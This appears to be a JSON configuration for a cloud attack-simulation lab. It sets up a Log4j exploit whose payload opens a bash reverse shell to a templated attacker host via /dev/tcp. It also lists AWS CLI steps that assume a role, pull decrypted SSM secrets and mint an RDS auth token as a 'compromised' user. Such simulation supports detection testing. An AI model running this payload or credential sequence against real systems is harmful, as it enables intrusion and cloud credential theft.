{
  "context" :  {
    "global": {
      "environment"          : "${ environment }",
      "deployment"           : "${ deployment }"
    },
    "aws" :  {
      "enabled" : true,
      "ssm" :  {
        "attacker": {
          "execute": {
            "docker_exploit_log4j": {
              "enabled": false,
              "attacker_http_port": 8088,
              "attacker_ldap_port": 1389,
              "attacker_ip": "shell-attacker-${ deployment }.${ dynu_dns_domain }",
              "target_port": 8080,
              "payload": "/bin/bash -c \"TASK=iam2rds /bin/bash -i >& /dev/tcp/shell-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
              "attack_delay": 50400
              "reverse_shell_port": 4444
            },
            "generate_web_traffic": {
              "enabled": false,
              "delay": 60,
              "urls": [
                "http://localhost:8091/cast"
              ]
            },
            "generate_aws_cli_traffic": {
              "enabled": false,
              "compromised_keys_user" : "khon.traktour@interlacelabs",
              "commands": [
                "apt-get install -y jq",
                "REGION=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | jq -r .region)",
                "ROLE_NAME=\"rds_user_access_role_ciemdemo\"",
                "SESSION_NAME=\"local-user\"",
                "AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')",
                "CREDS=$(aws sts assume-role --role-arn \"arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME\" --role-session-name \"$SESSION_NAME\")",
                "AWS_ACCESS_KEY_ID=$(echo \"$CREDS\" | jq -r '.Credentials.AccessKeyId')",
                "AWS_SECRET_ACCESS_KEY=$(echo \"$CREDS\" | jq -r '.Credentials.SecretAccessKey')",
                "AWS_SESSION_TOKEN=$(echo \"$CREDS\" | jq -r '.Credentials.SessionToken')",
                "AWS_DEFAULT_REGION=$REGION",
                "AWS_DEFAULT_OUTPUT=json",
                "DBHOST=\"$(aws ssm get-parameter --name=\"db_host\" --with-decryption $opts| jq -r '.Parameter.Value' | cut -d \":\" -f 1)\"",
                "DBUSER=\"$(aws ssm get-parameter --name=\"db_username\" --with-decryption $opts | jq -r '.Parameter.Value')\"",
                "DBPORT=\"$(aws ssm get-parameter --name=\"db_port\" --with-decryption $opts | jq -r '.Parameter.Value')\"",
                "TOKEN=\"$(aws rds generate-db-auth-token --hostname $DBHOST --port $DBPORT --username $DBUSER)\""
              ]
            }
          },
          "responder": {
            "reverse_shell_multistage": {
              "enabled": true,
              "listen_ip": "0.0.0.0",
              "listen_port": "4444",
              "payload": "touch /tmp/multistage_pwned",
              "attack_delay": 50400
            }
          }
        }
      }
    }
  }
}